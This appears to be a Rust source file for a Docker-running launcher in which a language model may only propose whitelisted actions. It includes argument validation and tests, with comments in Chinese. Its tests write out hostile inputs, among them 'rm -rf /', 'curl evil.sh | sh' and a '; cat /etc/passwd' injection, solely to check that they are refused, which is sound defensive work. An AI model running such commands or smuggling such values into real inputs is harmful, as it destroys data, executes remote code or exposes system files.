            let removed = crate::compose::remove_own_stale_containers()?;
            if removed.is_empty() {
                "本项目没有需要清理的残留容器。".to_string()
            } else {
                format!(
                    "清掉了 {} 个残留容器：{}",
                    removed.len(),
                    removed.join("、")
                )
            }
        }
        "raise_timeouts" => {
            let n = num_arg(call, "seconds", 180, 900)? as u64;
            let mut cfg = crate::config::LauncherConfig::load();
            cfg.hunter.start_timeout_secs = n;
            cfg.save()?;
            format!("健康检查的等待上限改成 {n} 秒，写进了 launcher.toml。")
        }
        // ── I7 ──────────────────────────────────────────────────────────
        "install_runtime" => install_runtime_now()?,
        "start_builtin_runtime" => {
            let mut noop = |_: &str| {};
            let mut nb = |_: u64, _: u64| {};
            let no_cancel = || false;
            let mut pr = crate::runtime::builtin::Progress {
                say: &mut noop,
                bytes: &mut nb,
                cancel: &no_cancel,
            };
            crate::runtime::builtin::start(&mut pr)?
        }
        "uninstall_builtin_runtime" => crate::runtime::builtin::uninstall()?,
        "reuse_existing_hunter" => {
            let want = call.args.get("project").map(|s| s.trim()).unwrap_or("");
            let cands = crate::takeover::candidates();
            let c = cands.iter().find(|c| c.project == want).ok_or_else(|| {
                AppError::new(
                    Code::NotImplemented,
                    format!("「{}」不在本机已有的 Hunter 里。", safe_id(want)),
                )
            })?;
            crate::takeover::adopt(c)?
        }
        "export_feedback_bundle" => {
            let path = crate::feedback::export_bundle()?;
            // 这份包要能发出去，路径给全（它本来就在用户自己机器上）
            format!("诊断包已生成：{}", path.display())
        }
        // Linux 上起 docker 服务多半要 root。**先原样试一次**（桌面上 polkit
        // 可能直接放行），不行再走系统自己的授权框 —— 不再退回「请你去终端里敲」（I8）
        "start_runtime" if call.args.get("app").map(|s| s.as_str()) == Some("systemd") => {
            match run_argv(&p) {
                Ok(t) => t,
                Err(e) => {
                    crate::lwarn!("直接起 docker 服务没成（{}），改走系统授权框", e.msg);
                    let inner: Vec<String> = p.argv.clone();
                    crate::runtime::elevate::run(
                        crate::runtime::elevate::Op::StartDockerService,
                        &inner,
                        Duration::from_secs(180),
                    )
                    .map_err(|e2| {
                        AppError::new(
                            e2.code,
                            format!("{}；用系统授权框再试也没成：{}", e.msg, e2.msg),
                        )
                    })?
                }
            }
        }
        // 剩下的都是「跑一个子进程」
        _ => run_argv(&p)?,
    };
    let text = crate::redact::mask_home(&crate::redact::redact(text.trim()));
    guard::audit(
        &p.id,
        &call.args,
        by,
        Some(p.level),
        &format!("成功：{}", first_line(&text)),
    );
    Ok(Outcome {
        id: p.id,
        ok: true,
        text,
    })
}

fn first_line(s: &str) -> String {
    s.lines().next().unwrap_or("").chars().take(200).collect()
}

/// `install_runtime` 的真身（I7 起；I8 改成走兜底链）。
///
/// 这个入口是给**规则层 / 模型 / 命令行**共用的「没有事件总线」版本：
/// 进度只写日志。界面上那条带实时下载字节数的路走的是
/// [`crate::assist::auto::Orchestrator::run_install_runtime`]，
/// 两条路**调的是同一个** [`crate::runtime::chain::install_docker`]。
fn install_runtime_now() -> AppResult<String> {
    let mut say = |s: &str| crate::linfo!("装容器运行时：{s}");
    let mut nb = |got: u64, total: u64| {
        if total > 0 && got % (16 * 1024 * 1024) < 256 * 1024 {
            crate::linfo!(
                "装容器运行时：已下 {} / {}",
                crate::assist::probe::human_bytes(got),
                crate::assist::probe::human_bytes(total)
            );
        }
    };
    let no_cancel = || false;
    let mut pr = crate::runtime::builtin::Progress {
        say: &mut say,
        bytes: &mut nb,
        cancel: &no_cancel,
    };
    let out = crate::runtime::chain::install_docker(&mut pr)?;
    let mut s = format!("{}（走的是「{}」这条路）", out.message, out.route.label());
    if !out.failed.is_empty() {
        // 前面失败过的路线**如实写出来**，不当无事发生
        s.push_str(&format!(
            "。在这之前试过：{}",
            out.failed
                .iter()
                .map(|(r, e)| format!("{}（没成：{}）", r.label(), first_line(e)))
                .collect::<Vec<_>>()
                .join("；")
        ));
    }
    Ok(s)
}

/// 轮询 `docker version` 直到服务端起来。**不是 sleep 一个固定时长然后宣布成功**。
fn wait_daemon(max: Duration) -> String {
    let t0 = std::time::Instant::now();
    loop {
        let d = crate::runtime::docker::detect();
        if d.daemon_running {
            return format!(
                "Docker 守护进程已就绪（等了 {} 秒，服务端 {}）。",
                t0.elapsed().as_secs(),
                d.server_version.as_deref().unwrap_or("版本读不到")
            );
        }
        if t0.elapsed() >= max {
            return format!(
                "等了 {} 秒，Docker 守护进程还是没起来。",
                t0.elapsed().as_secs()
            );
        }
        std::thread::sleep(Duration::from_secs(2));
    }
}

/// 把一整段输出切成行，交给 [`crate::compose::extract_error_text`]。
fn split_lines(s: &str) -> Vec<String> {
    s.lines().map(str::to_string).collect()
}

/// 本机 docker 凭据助手的现状（I6）。**只报事实**：配的是谁、在不在、在哪。
fn cred_helper_report() -> String {
    let setup = crate::dockercfg::read_user();
    let mut s = String::new();
    s.push_str(&format!(
        "docker 配置目录：{}（config.json {}）\n",
        crate::redact::mask_home(&crate::dockercfg::user_dir().to_string_lossy()),
        if setup.present { "在" } else { "不在" }
    ));
    match &setup.creds_store {
        Some(v) => s.push_str(&format!("credsStore = {v}\n")),
        None => s.push_str("credsStore：没配\n"),
    }
    if !setup.cred_helpers.is_empty() {
        s.push_str(&format!("credHelpers：{}\n", setup.cred_helpers.join("、")));
    }
    let st = crate::dockercfg::helper_status();
    if st.is_empty() {
        s.push_str("没有要用的凭据助手，拉公开镜像不会走这条路。\n");
        return s;
    }
    for (name, found) in st {
        match found {
            Some(p) => s.push_str(&format!("✓ {name} → {}\n", crate::redact::mask_home(&p))),
            None => s.push_str(&format!("✗ {name} —— 补全后的 PATH 上也找不到\n")),
        }
    }
    s.push_str(&format!("{}\n", crate::runtime::env::current().one_line()));
    s
}

fn network_report() -> String {
    let tag = crate::config::LauncherConfig::load().hunter.tag;
    let mut s = String::new();
    for c in &crate::registry::CANDIDATES {
        let p = crate::registry::probe(c, &tag, Duration::from_secs(8));
        s.push_str(&format!(
            "{} {} · {} ms{}\n",
            if p.available { "可用" } else { "不可用" },
            p.label,
            p.elapsed_ms,
            p.detail.map(|d| format!(" · {d}")).unwrap_or_default()
        ));
    }
    s
}

fn run_argv(p: &Plan) -> AppResult<String> {
    let Some((prog, args)) = p.argv.split_first() else {
        return Err(AppError::new(
            Code::Unknown,
            format!("动作 {} 没有可执行的命令", p.id),
        ));
    };
    guard::argv(&p.argv)?;
    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
    let timeout = if p.id == "brew_install" || p.id == "restart_stack" {
        Duration::from_secs(600)
    } else {
        Duration::from_secs(60)
    };
    let r = crate::proc::run_timeout(prog, &refs, timeout)?;
    let mut s = format!("退出码 {:?}\n", r.status);
    if !r.stdout.trim().is_empty() {
        s.push_str(r.stdout.trim());
        s.push('\n');
    }
    if !r.stderr.trim().is_empty() {
        s.push_str("stderr: ");
        s.push_str(r.stderr.trim());
        s.push('\n');
    }
    // **退出码不是 0 就是失败**（I5）。
    //
    // 原先这里一律 `Ok(...)`，于是 `systemctl start docker` 因为没有权限退出码 1，
    // 界面上照样显示「✓ 已处理」，总指挥也以为修好了 —— 接着白等 90 秒 `wait_daemon`、
    // 再原样重试三个回合（场景 2 首轮实测：4 分 39 秒全花在这上面）。
    // 只读动作例外：`docker version` 在 daemon 没起时退出码就是 1，那本身就是答案。
    if p.level != Level::ReadOnly && r.status != Some(0) {
        return Err(AppError::new(
            Code::Unknown,
            format!(
                "「{}」没成功（{}）：{}",
                p.title,
                s.lines().next().unwrap_or(""),
                r.err_line()
            ),
        ));
    }
    Ok(s)
}

// ── 参数校验 ──────────────────────────────────────────────────────────────

pub const RUNTIME_APPS: &[&str] = &["orbstack", "docker-desktop", "colima", "systemd"];
const BREW_FORMULAS: &[&str] = &["docker", "docker-compose", "colima", "docker-buildx"];

pub fn runtime_label(app: &str) -> &'static str {
    match app {
        "orbstack" => "OrbStack",
        "docker-desktop" => "Docker Desktop",
        "colima" => "Colima",
        "systemd" => "systemd 的 docker 服务",
        _ => "容器运行时",
    }
}

/// 启动某个运行时要跑的命令。
///
/// mac 上用 `open -a`（系统自己去找 .app，比我们猜路径可靠）；Linux 上只有 systemd
/// 这一条；Colima 三平台都是 `colima start`。找不到对应的做法就**如实拒绝**，
/// 不硬凑一条大概能跑的命令。
fn start_runtime_argv(app: &str) -> AppResult<Vec<String>> {
    match app {
        "orbstack" | "docker-desktop" => {
            if !cfg!(target_os = "macos") {
                return Err(AppError::new(
                    Code::NotImplemented,
                    format!("{} 只在 macOS 上能这样启动。", runtime_label(app)),
                ));
            }
            // `open` 在 /usr/bin，GUI 程序的默认 PATH 里就有它；仍然走定位器统一口径
            let open = which::resolve("open")
                .resolved
                .unwrap_or_else(|| "/usr/bin/open".to_string());
            let name = if app == "orbstack" {
                "OrbStack"
            } else {
                "Docker"
            };
            Ok(vec![open, "-a".into(), name.into()])
        }
        "colima" => {
            let c = which::resolve("colima").resolved.ok_or_else(|| {
                AppError::new(
                    Code::NotImplemented,
                    "这台机器上没找到 colima。".to_string(),
                )
            })?;
            Ok(vec![c, "start".into()])
        }
        "systemd" => {
            if !cfg!(target_os = "linux") {
                return Err(AppError::new(
                    Code::NotImplemented,
                    "systemd 只在 Linux 上有。".to_string(),
                ));
            }
            let sc = which::resolve("systemctl")
                .resolved
                .unwrap_or_else(|| "systemctl".to_string());
            Ok(vec![sc, "start".into(), "docker".into()])
        }
        other => Err(AppError::new(
            Code::NotImplemented,
            format!("认不得的运行时「{}」。", safe_id(other)),
        )),
    }
}

fn enum_arg(call: &Call, name: &str, allowed: &[&str]) -> AppResult<String> {
    let v = call
        .args
        .get(name)
        .map(|s| s.trim().to_ascii_lowercase())
        .unwrap_or_default();
    if allowed.contains(&v.as_str()) {
        return Ok(v);
    }
    Err(AppError::new(
        Code::NotImplemented,
        format!(
            "参数 {name} 的取值「{}」不在允许的范围里（只能是 {}）。",
            safe_id(&v),
            allowed.join(" / ")
        ),
    ))
}

fn num_arg(call: &Call, name: &str, lo: i64, hi: i64) -> AppResult<i64> {
    let raw = call.args.get(name).map(|s| s.trim()).unwrap_or("");
    let n: i64 = raw.parse().map_err(|_| {
        AppError::new(
            Code::NotImplemented,
            format!("参数 {name} 要是个整数，收到的是「{}」。", safe_id(raw)),
        )
    })?;
    if n < lo || n > hi {
        return Err(AppError::new(
            Code::NotImplemented,
            format!("参数 {name} 要在 {lo}–{hi} 之间，收到的是 {n}。"),
        ));
    }
    Ok(n)
}

/// 路径参数：必须**真实存在且可执行**。这一条挡的是「模型编了一条路径」。
fn path_arg(call: &Call, name: &str) -> AppResult<String> {
    let raw = call.args.get(name).map(|s| s.trim()).unwrap_or("");
    if raw.is_empty() {
        return Err(AppError::new(
            Code::NotImplemented,
            format!("参数 {name} 是空的。"),
        ));
    }
    let probe = which::resolve_with("docker", raw, &which::Policy::default());
    if !probe.found() {
        return Err(AppError::new(
            Code::NotImplemented,
            format!(
                "{} 这个位置没有可执行文件，不能写进设置。",
                crate::redact::mask_home(raw)
            ),
        ));
    }
    Ok(probe.resolved.unwrap_or_else(|| raw.to_string()))
}

/// 拒绝信息里回显参数时先截断 + 脱敏，别把模型吐的一长串原样塞进日志与界面。
fn safe_id(s: &str) -> String {
    let t: String = s.chars().take(40).collect();
    crate::redact::redact(&t)
}

// ── 只读动作的具体实现 ────────────────────────────────────────────────────

/// I5：不只说「占了」，还要说**被谁占了**。
///
/// 0.1.4 给模型的诊断里只有「被占用」三个字，模型于是把用户自己另一套 Hunter
/// 猜成了「残留容器」—— 证据不全的时候，模型只会把空白填满，不会说「我不知道」。
fn port_report() -> String {
    let cfg = crate::config::LauncherConfig::load();
    let sv = crate::ports::Survey::collect();
    let mut s = String::new();
    for (name, port) in cfg.hunter.ports.as_pairs() {
        let v = sv.verdict(port, &[crate::config::PROJECT]);
        s.push_str(&format!("{name} {}\n", v.human()));
    }
    s
}

fn disk_report() -> String {
    match super::probe::disk_free(&crate::paths::root()) {
        Some((free, total)) => format!(
            "工作目录所在分区：剩余 {} / 共 {}",
            crate::assist::probe::human_bytes(free),
            crate::assist::probe::human_bytes(total)
        ),
        None => "读不到磁盘余量（这个平台上没有可用的接口）".to_string(),
    }
}

#[cfg(test)]
pub(crate) mod tests {

    /// I8 · **取消「Sensitive 要用户点一下」之后补的那一道。**
    ///
    /// 全自动档下 `needs_confirm` 恒为 false，所以「方向该由用户定」的动作
    /// 必须有一道自己的门，而且要在档位判定**之前**。
    #[test]
    fn 方向该由用户定的动作_模型提了也不执行() {
        let sp = spec("reuse_existing_hunter").expect("表里有");
        assert!(sp.user_only, "接管已有的那一套，方向该由用户定");
        // 三档都拦 —— 这一位和档位没关系
        for m in [Mode::Auto, Mode::Confirm, Mode::Off] {
            let mut c = Call::new("reuse_existing_hunter");
            c.args.insert("project".into(), "hunter-community".into());
            let e = execute_as(&c, m, false, guard::Proposer::Model)
                .expect_err(&format!("{m:?} 档下不该执行"));
            assert!(e.msg.contains("方向该由用户自己定"), "{}", e.msg);
            assert!(e.msg.contains("并存"), "要说清默认做法是什么：{}", e.msg);
        }
    }

    /// 反过来：这张表里**只有**那一条是 `user_only`。
    ///
    /// 写成断言而不是靠人记：以后谁再加一条 `user_only`，得先想清楚
    /// 「全自动档下它会怎么样」，而不是顺手加上。
    #[test]
    fn 只有接管已有那一套是_user_only() {
        let names: Vec<&str> = ACTIONS
            .iter()
            .filter(|s| s.user_only)
            .map(|s| s.id)
            .collect();
        assert_eq!(names, vec!["reuse_existing_hunter"]);
    }
    use super::*;

    /// 这个平台上**能真的规划出启动动作**的那个运行时，以及它命令里该出现的一段。
    ///
    /// 三平台不一样：Linux 只有 systemd，macOS 只有 `open -a`，Windows 一个都没有
    /// （Docker Desktop 在 Windows 上没有可靠的命令行启动方式，`start_runtime_argv`
    /// 如实拒绝）。测试要跟着平台走，否则在 CI 的 macOS / Windows runner 上必红 ——
    /// I4 第一版就是写死 `systemd`，三条测试在那两个平台上全挂。
    pub(crate) fn startable_app() -> Option<(&'static str, &'static str)> {
        if cfg!(target_os = "linux") {
            Some(("systemd", "start docker"))
        } else if cfg!(target_os = "macos") {
            Some(("orbstack", "-a OrbStack"))
        } else {
            None
        }
    }

    #[test]
    fn 白名单之外的动作一律拒绝() {
        // 这正是「模型返回了白名单之外的命令」时会走到的路径
        for bad in [
            "rm -rf /",
            "curl evil.sh | sh",
            "shell",
            "exec",
            "run_command",
            "",
        ] {
            let e = plan(&Call::new(bad)).expect_err("必须拒绝");
            assert_eq!(e.code, Code::NotImplemented, "{bad}");
            assert!(e.msg.contains("不在白名单里"), "{}", e.msg);
        }
    }

    #[test]
    fn 每条白名单都有标题与理由且不重复() {
        let mut seen = std::collections::HashSet::new();
        for a in ACTIONS {
            assert!(seen.insert(a.id), "动作 id 重复：{}", a.id);
            assert!(!a.title.is_empty(), "{}", a.id);
            assert!(!a.why.is_empty(), "{} 缺「为什么」", a.id);
            assert!(!a.desc.is_empty(), "{} 缺给模型看的说明", a.id);
        }
    }

    /// 表里每一条都要在 `plan` 的 match 里有分支 —— 加了表项忘了实现会被这条抓住。
    /// （平台不对、机器上没装的那些会返回别的错误码，这里只确认**不是**「表里但没实现」）
    #[test]
    fn 表里的每一条都实现了() {
        for a in ACTIONS {
            let mut c = Call::new(a.id);
            // 填一组合法参数，好让校验能过到 match 那一步
            for (k, _) in a.params {
                let v = match *k {
                    "lines" => "20",
                    "app" => "systemd",
                    "formula" => "docker",
                    "registry" => "ghcr",
                    "path" => "/nonexistent-on-purpose",
                    _ => "x",
                };
                c.args.insert(k.to_string(), v.to_string());
            }
            match plan(&c) {
                Ok(_) => {}
                Err(e) => assert!(
                    !e.msg.contains("在表里但还没实现"),
                    "{} 没有实现分支：{}",
                    a.id,
                    e.msg
                ),
            }
        }
    }

    /// 用 `remap_ports`：它在三个平台上都规划得出来，所以这条测试盯的是
    /// 「没确认就不执行」这一道闸本身，而不是某个平台有没有那个运行时。
    #[test]
    fn 改动系统的动作没确认就不执行() {
        let e = execute(&Call::new("remap_ports"), false).expect_err("没确认不能执行");
        assert!(e.msg.contains("确认"), "{}", e.msg);
        assert_eq!(
            plan(&Call::new("remap_ports")).unwrap().kind,
            Kind::Mutating
        );

        // 这个平台上能启动的那个运行时，同样要挡住
        if let Some((app, _)) = startable_app() {
            let e = execute(&Call::with("start_runtime", "app", app), false)
                .expect_err("没确认不能执行");
            assert!(e.msg.contains("确认"), "{}", e.msg);
        }
    }

    #[test]
    fn 参数不合法就拒绝而不是猜一个() {
        // 枚举外的取值
        let e = plan(&Call::with("start_runtime", "app", "rm -rf /")).expect_err("该拒绝");
        assert!(e.msg.contains("不在允许的范围里"), "{}", e.msg);
        // 越界的数字
        let e = plan(&Call::with("read_log_tail", "lines", "99999")).expect_err("该拒绝");
        assert!(e.msg.contains("1–200"), "{}", e.msg);
        // 不是数字
        let e =
            plan(&Call::with("read_log_tail", "lines", "; cat /etc/passwd")).expect_err("该拒绝");
        assert!(e.msg.contains("整数"), "{}", e.msg);
        // 编出来的路径
        let e = plan(&Call::with(
            "set_docker_path",
            "path",
            "/opt/made/up/docker",
        ))
        .expect_err("该拒绝");
        assert!(e.msg.contains("没有可执行文件"), "{}", e.msg);
        // 不存在的镜像源
        let e =
            plan(&Call::with("switch_registry", "registry", "evil-registry")).expect_err("该拒绝");
        assert!(e.msg.contains("不在候选里"), "{}", e.msg);
    }

    /// 展示的命令和真跑的命令必须是同一个来源。
    #[test]
    fn 展示的命令就是要执行的那个参数数组() {
        let p = plan(&Call::new("docker_version")).expect("这条不需要参数");
        assert_eq!(p.kind, Kind::ReadOnly);
        assert!(p.argv.len() >= 2, "{:?}", p.argv);
        assert_eq!(p.argv[1], "version");
        assert!(
            p.command_line().ends_with(" version"),
            "{}",
            p.command_line()
        );
    }

    /// 带空格的参数在**展示**时加引号，但 argv 里仍然是一个完整元素
    /// （红线 3：执行走参数数组，永远不经过 shell）。
    #[test]
    fn 展示时的引号不影响参数数组() {
        let p = Plan {
            id: "x".into(),
            kind: Kind::ReadOnly,
            level: Level::ReadOnly,
            title: "t".into(),
            why: "w".into(),
            argv: vec!["/usr/bin/open".into(), "-a".into(), "Docker Desktop".into()],
            summary: None,
            user_only: false,
        };
        assert_eq!(p.command_line(), "/usr/bin/open -a \"Docker Desktop\"");
        assert_eq!(p.argv[2], "Docker Desktop");
    }

    #[test]
    fn 拒绝信息里不会回显一长串东西() {
        let long = "x".repeat(500);
        let e = plan(&Call::new(&long)).expect_err("该拒绝");
        assert!(e.msg.len() < 200, "拒绝信息太长了：{}", e.msg.len());
    }

    #[test]
    fn 拒绝信息也要脱敏() {
        let e =
            plan(&Call::new("hunt_tools_q6sKaaaaaaaaaaaaaaaaaaaaaaaaQMo2")).expect_err("该拒绝");
        assert!(!e.msg.contains("q6sK"), "{}", e.msg);
    }
}
